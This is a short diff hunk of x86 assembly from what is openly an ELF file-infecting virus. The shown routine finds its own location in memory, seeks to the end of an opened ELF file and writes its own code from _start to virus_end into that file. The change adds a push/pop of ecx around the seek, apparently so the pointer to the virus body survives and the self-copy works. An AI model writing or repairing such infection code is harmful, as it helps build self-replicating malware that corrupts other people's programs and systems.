@@ -70,7 +70,9 @@ _start:
 	;now we should write the code from _start to virus_end
 	call get_my_loc				;now ecx holds location for next_i
 	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
+	push ecx
 	lseek esi, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	pop ecx
 	write esi, ecx, virus_end-_start
 	close esi
 	jmp VirusExit
